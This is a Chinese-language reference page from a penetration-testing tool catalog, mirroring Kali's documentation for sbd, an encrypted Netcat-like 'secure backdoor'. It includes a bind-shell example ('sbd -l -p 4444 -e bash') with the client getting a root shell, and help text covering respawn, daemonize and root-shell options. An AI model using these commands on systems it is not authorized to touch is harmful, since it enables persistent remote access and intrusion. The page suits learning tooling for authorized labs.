# sbd

> Secure backdoor for Linux and Windows sbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. sbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe…

> **功能分类**：后渗透 ｜ **Kali 包**：`sbd` ｜ **官方文档**：<https://www.kali.org/tools/sbd/>

## 1. 安装

```bash
sudo apt update
sudo apt install sbd
```

| 项目 | 内容 |
|------|------|
| 版本 | 1.37 |
| 架构 | any |
| 可执行命令 | `sbd` |
| 依赖 | `libc6` |
| 安装体积 | 163 KB |
| 官网 | <https://mirrors.kernel.org/gentoo/distfiles/sbd-1.37.tar.gz> |
| 源码仓库 | <https://gitlab.com/kalilinux/packages/sbd> |
| 包追踪 | <https://pkg.kali.org/pkg/sbd> |

## 2. 官方用法示例

> 以下为 Kali 官方工具页给出的示例与输出原文。

```text
Usage Example
On the server, listen for a connection (-l) on port 4444 (-p 4444), execute bash on connection (-e bash) and display verbose output (-v) with no name resolution (-n).
On the client, connect to the remote server IP address (192.168.1.202) and port (4444).
root@kali:~# sbd -l -p 4444 -e bash -v -n
listening on port 4444

root@kali:~# sbd 192.168.1.202 4444
id
uid=0(root) gid=0(root) groups=0(root)
```

## 3. 命令与参数（官方 help / man 原文）

本包提供 1 个可执行命令，下面是官方页面内嵌的帮助原文。

### `sbd`

> 官方示例调用：`sbd -l -p 4444 -e bash -v -n`

```text
root@kali:~# sbd -l -p 4444 -e bash -v -n
listening on port 4444
```

### `sbd 192.168.1.202 4444`

> 官方示例调用：`sbd 192.168.1.202 4444`

```text
root@kali:~# sbd 192.168.1.202 4444
id
uid=0(root) gid=0(root) groups=0(root)
```

### `sbd -h`

> 官方示例调用：`sbd -h`

```text
root@kali:~# sbd -h
sbd 1.37 Copyright (C) 2004 Michel Blomgren <
[email protected]
>
$Id: sbd.c,v 1.37 2005/08/21 22:40:47 shadow Exp $
This program is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free Software
Foundation; either version 2 of the License, or (at your option) any later
version.
connect (tcp): sbd [-options] host port
listen (tcp):  sbd -l -p port [-options]
options:
    -l          listen for incoming connection
    -p n        choose port to listen on, or source port to connect out from
    -a address  choose an address to listen on or connect out from
    -e prog     program to execute after connect (e.g. -e cmd.exe or -e bash)
    -r n        infinitely respawn/reconnect, pause for n seconds between
                connection attempts. -r0 can be used to re-listen after
                disconnect (just like a regular daemon)
    -c on|off   encryption on/off. specify whether you want to use the built-in
                AES-CBC-128 + HMAC-SHA1 encryption implementation (by
                Christophe Devine - http://www.cr0.net:8040/) or not
                default is: -c on
    -k secret   override default phrase to use for encryption (secret must be
                shared between client and server)
    -q          hush, quiet, don't print anything (overrides -v)
    -v          be verbose
    -n          toggle numeric-only IP addresses (don't do DNS resolution). if
                you specify -n twice, original state will be active (i.e. -n
                works like a on/off switch)
    -m          toggle monitoring (snooping) on/off (only used with the -e
                option). snooping can also be turned on by specifying -vv (-v
                two times)
    -P prefix   add prefix (+ a hardcoded separator) to all outbound data.
                this option is mostly only useful for sbd in "chat mode" (to
                prefix lines you send with your nickname)
    -H on|off   highlight incoming data with a hardcoded (color) escape
                sequence (for e.g. chatting). default is: -H off
    -V          print version banner and exit (include that output in your
                bug report and send bug report to
[email protected]
)
unix-like OS specific options:
    -s          invoke a shell, nothing else. if sbd is setuid 0, it'll invoke
                a root shell
    -w n        "immobility timeout" in seconds for idle read/write operations
                and program execution (the -e option)
    -D on|off   fork and run in background (daemonize). default: -D off
Updated on: 2026-Mar-02
 Edit this page
sara
scapy
LIGHT
DARK
Links
Home
Download / Get Kali
Blog
OS Documentation
Tool Documentation
System Status
Archived Releases
Partnerships
Platforms
ARM (SBC)
NetHunter (Mobile)
Amazon AWS
Docker
Linode
Microsoft Azure
Microsoft Store (WSL)
Vagrant
Development
Bug Tracker
Continuous Integration
Network Mirror
Package Tracker
GitLab
Community
Discord
Support Forum
PeerTube
Follow Us
Bluesky
Facebook
Instagram
Mastodon
Substack
X
Newsletter
RSS
Policies
Cookie Policy
Privacy Policy
Trademark Policy
© OffSec Services Limited 2026. All rights reserved.
Kali Linux is part of OffSec's Community Projects
Learn more about OffSec's free, open-source penetration testing tools for cybersecurity professionals
```

## 4. 实践清单

按顺序做完这五步，就能把工具从「装上」推进到「会用」：

- [ ] **1.** **装好并确认版本** —— `sudo apt install sbd`，再执行 `sbd --version` 2>/dev/null || `sbd -V`
- [ ] **2.** **读官方帮助** —— `sbd -h`，需要细节时 `man sbd`
- [ ] **3.** **在自有靶场跑最小用例** —— 用 `sbd -h` 里最简单的那个子命令试一次
- [ ] **4.** **对照官方文档确认参数语义** —— <https://www.kali.org/tools/sbd/>，重点核对上一步用到的每个参数
- [ ] **5.** **记录输出并解读** —— 把关键字段抄进笔记，写清「它说明什么」「下一步该做什么」

> ⚠️ 只在**自己的设备**或**获得书面授权**的目标上使用。未授权扫描/入侵在多数司法辖区构成违法。
> 靶场搭建见 [`../../labs/README.md`](../../labs/README.md)。

## 5. 相关

- 精讲教程：本工具暂无专篇，可在 [`../../tools/tutorials/`](../../tools/tutorials/) 中按分类查阅同类工具
- 按攻击阶段浏览同类工具：[`../../tools/by-attack/command-and-control.md`](../../tools/by-attack/command-and-control.md)
- 按包速查：[`../catalog/`](../catalog/) ｜ 全量清单：[`../catalog/all-tools.md`](../catalog/all-tools.md)
- Kali 官方工具页：<https://www.kali.org/tools/sbd/>

---

## 来源

- 工具元数据与用法示例、help 原文均抓取自 <https://www.kali.org/tools/sbd/>（同步日期：2026-09-15）
- 抓取与生成脚本：`scripts/fetch_kali_tools.py` · `scripts/fetch_kali_usage.py` · `scripts/gen_kali_reference.py`
